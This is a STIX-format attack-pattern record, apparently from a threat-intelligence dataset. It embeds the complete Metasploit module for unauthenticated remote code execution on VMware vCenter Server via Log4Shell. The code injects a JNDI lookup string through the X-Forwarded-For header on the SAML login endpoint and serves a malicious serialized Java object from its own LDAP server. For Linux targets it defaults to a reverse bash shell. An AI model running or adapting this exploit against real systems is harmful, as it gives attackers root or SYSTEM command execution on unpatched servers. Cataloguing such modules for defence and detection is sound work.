{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b116d096-61ac-4156-880e-3a7879310cb5",
    "created": "2024-08-14T17:09:57.334197Z",
    "modified": "2024-08-14T17:09:57.334201Z",
    "name": "VMware vCenter Server Unauthenticated JNDI Injection RCE (via Log4Shell)",
    "description": " VMware vCenter Server is affected by the Log4Shell vulnerability whereby a JNDI string can sent to the server that will cause it to connect to the attacker and deserialize a malicious Java object. This results in OS command execution in the context of the root user in the case of the Linux virtual appliance and SYSTEM on Windows.  This module will start an LDAP server that the target will need to connect to. This exploit uses the logon page vector. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/vmware_vcenter_log4shell.rb",
            "external_id": "vmware_vcenter_log4shell.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-44228"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2021-0028.html"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/w3bd3vil/status/1469814463414951937"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Log4Shell\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::CheckModule\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'VMware vCenter Server Unauthenticated JNDI Injection RCE (via Log4Shell)',\n      'Description' => %q{\n        VMware vCenter Server is affected by the Log4Shell vulnerability whereby a JNDI string can sent to the server\n        that will cause it to connect to the attacker and deserialize a malicious Java object. This results in OS\n        command execution in the context of the root user in the case of the Linux virtual appliance and SYSTEM on\n        Windows.\n\n        This module will start an LDAP server that the target will need to connect to. This exploit uses the logon page\n        vector.\n      },\n      'Author' => [\n        'Spencer McIntyre', # this exploit module and JNDI/LDAP lib stuff\n        'RageLtMan <rageltman[at]sempervictus>', # JNDI/LDAP lib stuff\n        'jbaines-r7', # vCenter research\n        'w3bd3vil' # vCenter PoC https://twitter.com/w3bd3vil/status/1469814463414951937\n      ],\n      'References' => [\n        [ 'CVE', '2021-44228' ],\n        [ 'URL', 'https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis'],\n        [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2021-0028.html' ],\n        [ 'URL', 'https://twitter.com/w3bd3vil/status/1469814463414951937' ]\n      ],\n      'DisclosureDate' => '2021-12-09',\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => {\n        'RPORT' => 443,\n        'SSL' => true,\n        'SRVPORT' => 389,\n        'WfsDelay' => 30,\n        'CheckModule' => 'auxiliary/scanner/http/log4shell_scanner'\n      },\n      'Targets' => [\n        [\n          'Windows', {\n            'Platform' => 'win'\n          },\n        ],\n        [\n          'Linux', {\n            'Platform' => 'unix',\n            'Arch' => [ARCH_CMD],\n            'DefaultOptions' => {\n              'PAYLOAD' => 'cmd/unix/reverse_bash'\n            }\n          },\n        ]\n      ],\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [IOC_IN_LOGS],\n        'AKA' => ['Log4Shell', 'LogJam'],\n        'Reliability' => [REPEATABLE_SESSION],\n        'RelatedModules' => [\n          'auxiliary/scanner/http/log4shell_scanner',\n          'exploit/multi/http/log4shell_header_injection'\n        ]\n      }\n    )\n    register_options([\n      OptString.new('TARGETURI', [ true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    validate_configuration!\n\n    return Exploit::CheckCode::Unknown if tenant.nil?\n\n    super\n  end\n\n  def check_options\n    {\n      'LDAP_TIMEOUT' => datastore['WfsDelay'],\n      'HTTP_HEADER' => 'X-Forwarded-For',\n      'TARGETURI' => normalize_uri(target_uri, 'websso', 'SAML2', 'SSO', tenant) + '?SAMLRequest=',\n      'HEADERS_FILE' => nil,\n      'URIS_FILE' => nil\n    }\n  end\n\n  def build_ldap_search_response_payload\n    return [] if @search_received\n\n    @search_received = true\n\n    print_good('Delivering the serialized Java object to execute the payload...')\n    build_ldap_search_response_payload_inline('BeanFactory')\n  end\n\n  def tenant\n    return @tenant unless @tenant.nil?\n\n    res = send_request_cgi('uri' => normalize_uri(target_uri, 'ui', 'login'))\n    return nil unless res&.code == 302\n    return nil unless res.headers['Location'] =~ %r{websso/SAML2/SSO/([^/]+)\\?}\n\n    @tenant = Regexp.last_match(1)\n  end\n\n  def trigger\n    @search_received = false\n    # HTTP request initiator\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri, 'websso', 'SAML2', 'SSO', tenant) + '?SAMLRequest=',\n      'headers' => { 'X-Forwarded-For' => log4j_jndi_string }\n    )\n  end\n\n  def exploit\n    validate_configuration!\n\n    start_service\n    trigger\n\n    sleep(datastore['WfsDelay'])\n    handler\n  ensure\n    cleanup\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-12-09",
    "x_mitre_platforms": [
        "unix'"
    ]
}